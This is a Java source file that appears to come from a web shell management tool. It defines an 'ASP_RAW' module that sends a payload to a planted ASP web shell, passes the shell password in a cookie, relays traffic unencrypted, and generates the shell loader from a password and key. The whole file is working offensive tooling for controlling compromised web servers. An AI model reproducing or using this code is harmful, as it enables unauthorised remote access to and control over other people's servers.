package shells.cryptions.aspXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(
   Name = "ASP_RAW",
   payloadName = "AspDynamicPayload"
)
public class AspRaw implements Cryption {
   private ShellEntity shell;
   private Http http;
   private byte[] key;
   private boolean state;
   private byte[] payload;

   public void init(ShellEntity context) {
      this.shell = context;
      this.http = this.shell.getHttp();
      this.key = this.shell.getSecretKeyX().getBytes();
      this.shell.getHeaders().put("Content-Type", "application/octet-stream");
      if (this.shell.getHeaders().get("Cookie") == null) {
         this.shell.getHeaders().put("Cookie", String.format("%s=%s;", context.getPassword(), "user"));
      }

      try {
         this.payload = this.shell.getPayloadModule().getPayload();
         if (this.payload != null) {
            this.http.sendHttpResponse(this.payload);
            this.state = true;
         } else {
            Log.error("payload Is Null");
         }

      } catch (Exception var3) {
         Log.error((Throwable)var3);
      }
   }

   public byte[] encode(byte[] data) {
      try {
         return data;
      } catch (Exception var3) {
         Log.error((Throwable)var3);
         return null;
      }
   }

   public byte[] decode(byte[] data) {
      if (data != null && data.length > 0) {
         try {
            return data;
         } catch (Exception var3) {
            Log.error((Throwable)var3);
            return null;
         }
      } else {
         return data;
      }
   }

   public boolean isSendRLData() {
      return false;
   }

   public boolean check() {
      return this.state;
   }

   public byte[] generate(String password, String secretKey) {
      return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), this.getClass().getSimpleName());
   }
}
